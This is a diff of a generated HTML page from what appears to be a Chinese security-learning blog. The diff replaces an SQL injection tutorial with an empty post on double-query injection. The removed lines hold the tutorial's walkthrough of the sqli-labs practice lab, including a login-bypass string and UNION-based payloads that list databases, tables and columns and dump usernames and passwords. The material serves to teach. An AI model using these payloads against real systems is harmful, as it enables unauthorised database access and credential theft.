@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="SQL注入攻击 SQL injection attack, 隐隐">
+    <meta name="keywords" content="SQL注入 双查询注入, 隐隐">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SQL注入攻击 SQL injection attack | 隐隐</title>
+    <title>SQL注入 双查询注入 | 隐隐</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -225,7 +225,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SQL注入攻击 SQL injection attack</h1>
+                    <h1 class="description center-align post-title">SQL注入 双查询注入</h1>
                 </div>
             </div>
         </div>
@@ -366,7 +366,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-06-07
+                    2021-06-09
                 </div>
                 
 
@@ -375,14 +375,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.2k
+                    0
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    1 分
                 </div>
                 
 
@@ -410,118 +410,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><img src="https://gitee.com/night7i/img/raw/master/img/sqlinjectioncover.png"></p>
-<p><img src="https://gitee.com/night7i/img/raw/master/img/20210608091147.png" alt="SQL注入思维导图"></p>
-<h3 id="什么是SQL注入？"><a href="#什么是SQL注入？" class="headerlink" title="什么是SQL注入？"></a>什么是SQL注入？</h3><p>SQL注入作为网络世界中最常见的攻击手段，想必大家多少有听过某某学长某某同学，修改了学校的数据库，修改了自己的成绩，修改了自己的饭卡权限…等等，在最常见Web攻击手段里，SQL注入首当其冲。</p>
-<br>
-
-<p>简单的来说，SQL注入是恶意用户通过篡改SQL查询语句，以通过非正常手段获取到自己需要的数据的一种方式。</p>
-<p><img src="https://gitee.com/night7i/img/raw/master/img/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86.png"></p>
-<p>在学习注入攻击之前你应该先有以下储备知识：</p>
-<ul>
-<li>PHP基础</li>
-<li>PHP连接数据库函数</li>
-<li>SQL基本语句</li>
-</ul>
-<p>在已有以上基础后可以知道PHP连接操作MySQL数据库时使用的sql语句通常是储存在变量内的，而我们通过网页提交的非法数据造成了语句的截断，例如PHP页面为 </p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select user from student where name = '<span class="token interpolation"><span class="token variable">$name</span></span>' and password=<span class="token interpolation"><span class="token variable">$pswd</span></span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>而$name数据如果是由前端提交的，如下表单</p>
-<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>yinyin<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pswd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>此时我们在 input标签内输入的name会被传入到后台处理 我们传入构造的非法字符串<code>1&#39; or 1=1 &#39;#</code></p>
-<p>PHP在接受恶意参数后，此时的SQL语句已经被我们篡改，便造成了网页的SQL注入</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select user from student where name = '1' or 1=1 # and password=<span class="token interpolation"><span class="token variable">$pswd</span></span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<h3 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h3><p>本次学习使用渗透测试靶场sqli-labs，服务器环境为PHP+MySQL</p>
-<p>下载地址：</p>
-<ul>
-<li><p><a target="_blank" rel="noopener" href="https://m.xp.cn/">phpstudy</a></p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">sqli-labs</a></p>
-</li>
-</ul>
-<p>搭建环境中请使用PHP7以下的版本，MySQL使用5.5以上版本</p>
-<h3 id="实战思路"><a href="#实战思路" class="headerlink" title="实战思路"></a>实战思路</h3><h4 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h4><p>GET - Error based - Single quotes - String</p>
-<p>基于错误 - 单引号字符型</p>
-<p><img src="https://gitee.com/night7i/img/raw/master/img/20210608160351.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">排除数值型注入：
-?id&#x3D;1&#39; and 1 &#x3D; 1 # 	&#x2F;&#x2F;页面正常回显
-?id&#x3D;1&#39; and 1 &#x3D; 2 # 	&#x2F;&#x2F;页面正常回显
-
-判断为字符型注入：
-?id&#x3D;1&#39;		&#x2F;&#x2F;页面报错
-?id&#x3D;1&#39; --+	&#x2F;&#x2F;页面正常回显
-
-判断列长度为 3：
-?id&#x3D;1&#39; order by 4 &#x2F;&#x2F;页面报错
-?id&#x3D;1&#39; order by 3 &#x2F;&#x2F;页面正常回显
-
-判断页面回显结果位置： （传入不存在的id数值）
-?id&#x3D;77&#39; union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>在判断完基本信息后我们需要对目标数据库具体库、表、字段、数据进行猜解</p>
-<p>引入知识点：<a href="/2021/06/08/SQL%E6%B3%A8%E5%85%A5-%E5%88%A9%E7%94%A8information-schema%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE">利用information_schema获取目标数据库数据</a></p>
-<p><strong>查询数据库:</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">查看当前网页调用的数据库：
-?id&#x3D;77&#39; union select 1,2,database()--+
-
-查看所有的数据库：
-?id&#x3D;77&#39; union select 1,2,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><strong>查询数据表:</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">查询当前数据库下所有的表：
-?id&#x3D;77&#39; union select 1,2,group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA&#x3D;database()--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><strong>查询字段:</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">查询users表内所有字段：
-?id&#x3D;77&#39; union select 1,2,group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA&#x3D;database() and TABLE_NAME&#x3D;&#39;users&#39;--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><strong>查询数据:</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">查询username以及password字段下所有数据：
-?id&#x3D;77&#39; union select 1,group_concat(username),group_concat(password) from users--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="https://gitee.com/night7i/img/raw/master/img/20210608110628.png" alt="username、password字段所有数据"></p>
-<hr>
-<h4 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h4><p>Error based- Intiger based</p>
-<p>基于错误 -  整形</p>
-<p><img src="https://gitee.com/night7i/img/raw/master/img/20210608160529.png"></p>
-<p>这里与Less1不同的地方是变量并没有使用双引号定义，此时的变量id为整型数据</p>
-<pre class="line-numbers language-none"><code class="language-none">判断为整型注入
-1 and 1&#x3D;1		&#x2F;&#x2F;页面正常显示
-1 and 1&#x3D;2		&#x2F;&#x2F;页面无法显示<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>在确定注入类型后再用常用的步骤尝试注入即可 需要注意的就是此时传入的变量后不需要使用引号闭合</p>
-<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;77 union select 1,group_concat(username),group_concat(password) from users--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<hr>
-<h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><p>GET - Error based- Single quotes with twist - string</p>
-<p>基于错误 -  单引号变型字符型</p>
-<p><img src="https://gitee.com/night7i/img/raw/master/img/20210608161333.png"></p>
-<p>观察注入点以及报错信息，判断注入点有括号闭合 构建SQL语句 后续步骤同上</p>
-<pre class="line-numbers language-none"><code class="language-none">判断注入点是否存在：
-?id&#x3D;1&#39;) and 1&#x3D;1 --+		&#x2F;&#x2F;页面正常显示
-?id&#x3D;1&#39;) and 1&#x3D;2 --+		&#x2F;&#x2F;页面无法显示<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h4><p>GET - Error based- Double Quotes - string</p>
-<p>基于错误 -  双引号字符型</p>
-<p><img src="https://gitee.com/night7i/img/raw/master/img/20210608191132.png" alt="image-20210608191125799"></p>
-<p>同样观察注入点，注入点参数用双引号闭合，构建闭合语句 后续步骤同上</p>
-<pre class="line-numbers language-none"><code class="language-none">判断注入点是否存在：
-?id&#x3D;1&quot;) and 1&#x3D;1 --+		&#x2F;&#x2F;页面正常显示
-?id&#x3D;1&quot;) and 1&#x3D;2 --+		&#x2F;&#x2F;页面无法显示<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h4><p>GET - Double Injection - Single Quotes - String</p>
-<p>双注入 - 单引号字符型</p>
-<p><img src="https://gitee.com/night7i/img/raw/master/img/20210609093944.png"></p>
-<p>这里的SQL语句与Less-1相同，不同的是传入id参数后，页面返回的值固定是<code>&#39;You are in…………&#39;</code>而不会返回查询到的结果，这个时候我们使用<a href="123">SQL注入 双查询注入</a>，可以使查询结果的一部分通过报错的形式显示出来</p>
-
+                
                 
             </div>
             <hr/>
@@ -547,7 +436,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://ayysec.com/2021/06/07/SQL%E6%B3%A8%E5%85%A5-SQL-injection-attack/">http://ayysec.com/2021/06/07/SQL%E6%B3%A8%E5%85%A5-SQL-injection-attack/</a>
+                    <a href="http://ayysec.com/2021/06/09/SQL%E6%B3%A8%E5%85%A5-%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/">http://ayysec.com/2021/06/09/SQL%E6%B3%A8%E5%85%A5-%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -630,16 +519,17 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/06/08/SQL%E6%B3%A8%E5%85%A5-%E5%88%A9%E7%94%A8information-schema%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE/">
+                <a href="/2021/06/09/SQL%E6%B3%A8%E5%85%A5-%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/">
                     <div class="card-image">
                         
-                        <img src="https://gitee.com/night7i/img/raw/master/img/20210608100438.png" class="responsive-img" alt="SQL注入 利用information_schema获取目标数据库数据">
+                        <img src="https://gitee.com/night7i/img/raw/master/img/20210609094924.jpg" class="responsive-img" alt="SQL注入 双查询注入">
                         
-                        <span class="card-title">SQL注入 利用information_schema获取目标数据库数据</span>
+                        <span class="card-title">SQL注入 双查询注入</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -649,9 +539,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-06-08
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-09
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -664,6 +554,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -682,12 +573,12 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/06/04/%E5%85%B3%E4%BA%8E%E9%9A%90%E9%9A%90%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%A4%A7%E7%BA%B2/">
+                <a href="/2021/06/08/SQL%E6%B3%A8%E5%85%A5-%E5%88%A9%E7%94%A8information-schema%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE/">
                     <div class="card-image">
                         
-                        <img src="https://gitee.com/night7i/img/raw/master/img/Snipaste_2021-06-07_10-50-43.jpg" class="responsive-img" alt="隐隐的学习大纲">
+                        <img src="https://gitee.com/night7i/img/raw/master/img/20210608100438.png" class="responsive-img" alt="SQL注入 利用information_schema获取目标数据库数据">
                         
-                        <span class="card-title">隐隐的学习大纲</span>
+                        <span class="card-title">SQL注入 利用information_schema获取目标数据库数据</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -698,14 +589,14 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-04
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-08
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Others/" class="post-category">
-                                    Others
+                            <a href="/categories/Web/" class="post-category">
+                                    Web
                                 </a>
                             
                             
@@ -715,8 +606,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E9%9A%8F%E7%AC%94/">
-                        <span class="chip bg-color">随笔</span>
+                    <a href="/tags/SQL-Injection/">
+                        <span class="chip bg-color">SQL Injection</span>
                     </a>
                     
                 </div>
